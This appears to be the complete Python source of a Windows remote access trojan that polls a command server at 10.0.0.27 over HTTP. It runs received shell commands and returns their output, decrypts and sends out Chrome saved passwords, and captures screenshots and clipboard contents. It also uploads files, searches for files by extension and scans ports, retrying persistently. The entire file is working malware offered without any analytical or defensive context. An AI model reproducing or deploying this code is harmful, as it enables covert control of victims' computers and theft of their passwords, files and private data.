import requests
import subprocess
import time
import os
import random
import socket
from PIL import ImageGrab as imagegrab
import tempfile
import shutil
from shutil import copyfile
import win32crypt
import sqlite3
from os import getenv
import pyperclip

def subprocess_args(include_stdout=True):
    shell = True
    if hasattr(subprocess, 'STARTUPINFO'):
        si = subprocess.STARTUPINFO()
        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        env = os.environ
    else:
        si = None
        env = None
    if include_stdout:
        ret = {'stdout': subprocess.PIPE}
    else:
        ret = {}
    ret.update({'stdin': subprocess.PIPE,
                'stderr': subprocess.PIPE,
                'startupinfo': si,
                'env': env,
                'shell': shell})
    return ret

def changeDirectory(directory):
    os.chdir(directory)
    requests.post(url = 'http://10.0.0.27',data = ('[+] CWD is ' + os.getcwd()))

def grabfile(path):
    if os.path.exists(path):
        rpath = os.path.realpath(path)
        url = 'http://10.0.0.27/store'
        files = {'file': open(path, 'rb'),'path': rpath}
        r = requests.post(url, files=files)
    else:
        post_response = requests.post(url='http://10.0.0.27',data='[-] Not able to find the file.')

def takescreenshot():
    dirpath = tempfile.mkdtemp()
    path = dirpath + '\img.jpg'
    imagegrab.grab().save(path, "JPEG")
    url = 'http://10.0.0.27/store'
    files = {'file': open(path, 'rb'),'path': 'screencap.jpg'}
    r = requests.post(url, files=files)
    files['file'].close()
    shutil.rmtree(dirpath)

def search(path,ext):
    list = ''
    for dirpath, dirname, files in os.walk(path):
        for file in files:
            if file.endswith(ext):
                list = list + '\n' + os.path.join(dirpath,file)
    requests.post(url='http://10.0.0.27',data=list)

def scanner(ip,ports):
    scan_result = ''
    for port in ports.split(','):
        try:
            sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            output = sock.connect_ex((ip,int(port)))

            if output == 0:
                scan_result = scan_result + "[+] Port " + port + " is open.\n"
            else:
                scan_result = scan_result + "[+] Port " + port + " is closed or the host is not reachable.\n"
            sock.close()
        except Exception as e:
            pass
    requests.post(url='http://10.0.0.27',data=scan_result)

def chromedump():
    path = getenv("LOCALAPPDATA") + r"\Google\Chrome\User Data\Default\Login Data"
    path2 = getenv("LOCALAPPDATA") + r"\Google\Chrome\User Data\Default\Login2"
    try:
        copyfile(path, path2)
        conn = sqlite3.connect(path2)
        cursor = conn.cursor()
        cursor.execute('SELECT action_url, username_value, password_value FROM logins')

        for raw in cursor.fetchall():
            password = win32crypt.CryptUnprotectData(raw[2])[1]
            requests.post(url='http://10.0.0.27',data=(raw[0] + '\n' + raw[1]) + '\n' + password.decode())

        conn.close()
        os.remove(path2)
    except Exception as e:
        requests.post(url='http://10.0.0.27',data=str(e))

def clipboardcapture(max):
    clips = []
    requests.post(url='http://10.0.0.27',data="Starting clipboard capture...")
    while len(clips) < int(max):
        if pyperclip.paste():
            value = pyperclip.paste()
            if value not in clips:
                clips.append(value)
            requests.post(url='http://10.0.0.27',data=str(clips))
            time.sleep(3)

def connect():
    while True:
        req = requests.get('http://10.0.0.27')
        command = req.text

        if "terminate" in command:
            return 1
        elif 'cd ' in command:
            code,directory = command.split()
            changeDirectory(directory)
        elif 'grab' in command:
            grab,path = command.split(" * ")
            grabfile(path)
        elif 'screencap' in command:
            takescreenshot()
        elif 'search' in command:
            command = command[7:]
            print(command)
            path,ext = command.split('*')
            search(path,ext)
        elif 'scan' in command:
            command = command[5:]
            ip,ports = command.split(':')
            scanner(ip,ports)
        elif 'chromedump' in command:
            chromedump()
        elif 'clipboardcapture' in command:
            clip,maximum = command.split()
            clipboardcapture(maximum)
        else:
            CMD = subprocess.Popen(command,**subprocess_args(True))
            post_response = requests.post(url='http://10.0.0.27', data=CMD.stdout.read())
            post_response = requests.post(url='http://10.0.0.27', data=CMD.stderr.read())

        time.sleep(3)

def main():
    while True:
        try:
            if connect() == 1:
                break
        except:
            sleep_for = random.randrange(1,10)
            time.sleep(sleep_for)       #Sleep for a random time between 1 and 10 seconds
            #time.sleep(sleep_for * 60) #Sleep for a random time between 1 and 10 minutes
            pass
    
main()
